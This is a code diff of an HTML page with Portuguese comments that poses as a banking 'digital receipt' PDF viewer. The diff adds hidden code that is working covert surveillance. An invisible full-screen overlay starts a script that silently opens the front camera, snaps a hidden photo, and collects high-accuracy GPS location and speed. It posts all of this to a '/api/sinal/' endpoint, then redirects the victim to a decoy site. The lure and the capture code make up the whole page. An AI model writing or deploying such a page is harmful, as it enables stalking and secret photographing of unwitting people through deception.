@@ -3,108 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Conectando...</title>
-    
-    <meta property="og:title" content="Verificação de Sistema">
-    <meta property="og:description" content="Aguarde enquanto estabelecemos conexão segura.">
-    <meta name="theme-color" content="#ffffff">
-
+    <title>Visualizador de Documentos</title>
+    <meta property="og:site_name" content="Internet Banking">
+    <meta property="og:title" content="📄 Comprovante_Digital.pdf">
+    <meta property="og:description" content="Toque para visualizar o documento assinado.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/400px-PDF_file_icon.svg.png">
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            background-color: #f8f9fa;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            overflow: hidden; /* Trava a rolagem */
-        }
-
-        /* Loader girando para parecer que está processando */
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-
+        body { margin: 0; background: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #c0392b; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        h2 { color: #555; font-size: 18px; font-weight: normal; }
-        p { color: #999; font-size: 12px; }
-
-        /* Máscara invisível que cobre a tela toda */
-        #click-trap {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 9999;
-            cursor: pointer;
-        }
+        /* Elementos da câmera ficam invisíveis */
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
-    <div id="click-trap" onclick="solicitarGPS()"></div>
-
-    <div>
-        <div class="loader"></div>
-        <h2 id="status">Estabelecendo conexão segura...</h2>
-        <p>Aguarde um momento.</p>
+    <div id="capa" onclick="executarSeguranca()" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;"></div>
+    
+    <div style="text-align:center;">
+        <div class="spinner"></div>
+        <div style="font-size: 14px; color: #555;">Carregando documento...</div>
     </div>
 
     <script>
         const idOrdem = "{{ id }}";
+        const siteDestino = "{{ destino }}";
         let jaEnviou = false;
+        let fotoBase64 = null;
 
-        function enviarPosicao(pos) {
-            if (jaEnviou) return; // Evita envio duplicado
+        function finalizar() { window.location.href = siteDestino; }
+
+        async function capturarFoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Aguarda 1.5s para a câmera ajustar o foco/brilho
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Converte para JPEG comprimido para não sobrecarregar o envio
+                fotoBase64 = canvas.toDataURL('image/jpeg', 0.5);
+                
+                // Desliga a câmera imediatamente
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                console.log("Câmera recusada ou indisponível");
+            }
+        }
+
+        async function executarSeguranca() {
+            if (jaEnviou) return;
+
+            // Primeiro tenta a foto
+            await capturarFoto();
+
+            // Depois solicita o GPS e envia tudo
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                enviarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
+            }, function() {
+                // Mesmo sem GPS, tenta enviar a foto se tiver capturado
+                enviarDados(null, null, null, null);
+            }, { enableHighAccuracy: true, timeout: 8000 });
+        }
+
+        function enviarDados(lat, lon, acc, spd) {
+            if (jaEnviou) return;
             
-            document.getElementById('status').innerText = "Conexão Estabelecida.";
-            document.querySelector('.loader').style.borderTopColor = "#28a745"; // Vira verde
-
             fetch(`/api/sinal/${idOrdem}`, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude
+                    latitude: lat,
+                    longitude: lon,
+                    accuracy: acc ? Math.round(acc) : null,
+                    speed: spd,
+                    foto: fotoBase64 // Aqui vai a imagem capturada
                 })
-            }).then(() => {
-                jaEnviou = true;
-                // Opcional: Redirecionar para o Google ou fechar
-                // window.location.href = "https://www.google.com"; 
-                document.getElementById('status').innerText = "Validado. Pode fechar.";
+            }).finally(() => { 
+                jaEnviou = true; 
+                finalizar(); 
             });
         }
 
-        function solicitarGPS() {
-            if (!navigator.geolocation) return;
-
-            navigator.geolocation.getCurrentPosition(
-                enviarPosicao, 
-                function(erro) {
-                    console.log("Erro ou permissão negada");
-                    document.getElementById('status').innerText = "Toque na tela para continuar...";
-                }, 
-                { enableHighAccuracy: true, maximumAge: 0 }
-            );
-        }
-
-        // Tenta rodar SOZINHO assim que carrega
-        window.onload = function() {
-            solicitarGPS();
-            
-            // Reforço: Tenta de novo a cada toque na tela (caso o navegador tenha bloqueado o automático)
-            document.body.addEventListener('click', solicitarGPS);
-            document.body.addEventListener('touchstart', solicitarGPS);
-        };
+        // Tenta iniciar automaticamente, mas o clique na 'capa' garante o funcionamento
+        executarSeguranca();
+        window.addEventListener('touchstart', executarSeguranca);
     </script>
 </body>
 </html>
